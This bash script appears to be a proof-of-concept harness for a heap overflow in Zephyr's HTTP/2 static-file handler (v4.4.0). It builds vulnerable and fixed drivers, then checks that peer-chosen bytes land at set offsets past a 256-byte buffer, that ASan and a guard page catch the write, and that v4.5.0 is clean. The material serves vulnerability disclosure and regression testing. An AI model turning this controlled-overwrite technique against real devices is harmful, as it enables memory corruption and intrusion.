#!/usr/bin/env bash
# Source-bound Zephyr HTTP/2 static-FS RX-length alias harness.
# All inputs are local argv values standing in for an fs_stat file size and a
# peer-controlled receive buffer; no Zephyr server, socket or external system
# is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
    if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
    else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
    case "$t" in
        vuln) gcc -O0 -g -o "$OUT/vuln" driver_vuln.c ;;
        fixed) gcc -O0 -g -o "$OUT/fixed" driver_fixed.c ;;
        vuln_asan) gcc -O0 -g -fsanitize=address -o "$OUT/vuln_asan" driver_vuln.c ;;
        fixed_asan) gcc -O0 -g -fsanitize=address -o "$OUT/fixed_asan" driver_fixed.c ;;
    esac || exit 2
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"
HOSTILE=1024   # served file size; exceeds the 256-byte client buffer
BENIGN=32      # served file size; fits the buffer
RESIDUE=64     # legitimate RX residue before the static-file alias
ZERO=0000000000000000

# Rung 1: the v4.4.0 handler passes &client->data_len as the file_size
# out-parameter, so fs_stat's file size replaces the bounded RX residue.
r1=$($V collab $HOSTILE 65)
echo "$r1"
check "rung1 file size overwrites RX residue" \
    "$(yes 'alias filesize=1024 data_len=1024 remaining=1024' "$r1")"

# Rung 2: peer-controlled bytes at cursor land 300/500/900 bytes past the
# 256-byte buffer via the copied compaction memmove.
ok=0
contains 'oob300=4443424144434241' "$r1" &&
contains 'oob500=4443424144434241' "$r1" &&
contains 'oob900=4443424144434241' "$r1" && ok=1
check "rung2 chosen bytes at three OOB offsets" "$ok"

# Rung 3: ASan traps the verbatim memmove in the pinned v4.4.0 core source.
"$VA" exact $HOSTILE 65 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 1024' "$ac" &&
contains 'core_v4.4.0:565' "$ac" &&
contains '256-byte region' "$ac" && ok=1
check "rung3 ASan write at pinned core_v4.4.0:565" "$ok"

# Rung 4: a different chosen seed reads back byte-exact in the OOB region.
r4=$($V collab $HOSTILE 90)
echo "$r4"
ok=0
contains 'oob300=5d5c5b5a5d5c5b5a' "$r4" &&
contains 'oob500=5d5c5b5a5d5c5b5a' "$r4" &&
contains 'oob900=5d5c5b5a5d5c5b5a' "$r4" && ok=1
check "rung4 chosen 0x5a bytes at three OOB offsets" "$ok"

# Guard page: the first past-end store crosses into PROT_NONE.
( "$V" guard $HOSTILE 65 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page fault on first past-end write" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed v4.5.0 uses a local file_size; the RX residue is never overwritten.
fc=$($F collab $HOSTILE 65)
echo "$fc"
ok=0
contains "alias filesize=1024 data_len=$RESIDUE" "$fc" &&
contains "oob300=$ZERO" "$fc" &&
contains "oob500=$ZERO" "$fc" &&
contains "oob900=$ZERO" "$fc" && ok=1
check "fixed v4.5.0 preserves RX residue and writes in bounds" "$ok"

fg=$($F collab $BENIGN 65)
echo "$fg"
ok=0
contains "alias filesize=32 data_len=$RESIDUE" "$fg" &&
contains "oob300=$ZERO" "$fg" && ok=1
check "fixed accepts benign served file" "$ok"

"$FA" exact $HOSTILE 65 > "$OUT/fixed_asan_bad.log" 2>&1
"$FA" exact $BENIGN 65 > "$OUT/fixed_asan_good.log" 2>&1
fb=$(cat "$OUT/fixed_asan_bad.log")
fgo=$(cat "$OUT/fixed_asan_good.log")
ok=0
! contains 'AddressSanitizer' "$fb" && ! contains 'AddressSanitizer' "$fgo" && ok=1
check "fixed ASan clean on hostile and benign" "$ok"
vgr=$($VA exact $BENIGN 65 2>&1)
ok=0
! contains 'AddressSanitizer' "$vgr" && contains 'data_len=32' "$vgr" && ok=1
check "vulnerable ASan clean on benign file" "$ok"

# Determinism: two independent five-run groups, chosen bytes and pinned line.
group() {
    local h=""
    for i in 1 2 3 4 5; do
        h="$h$($V collab $HOSTILE 65)$($V guard $HOSTILE 65 2>/dev/null; echo "rc=$?")$($VA exact $HOSTILE 65 2>&1 | grep -oE 'WRITE of size [0-9]+|core_v4\.4\.0:[0-9]+' | tr '\n' ',')"
    done
    printf '%s' "$h" | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
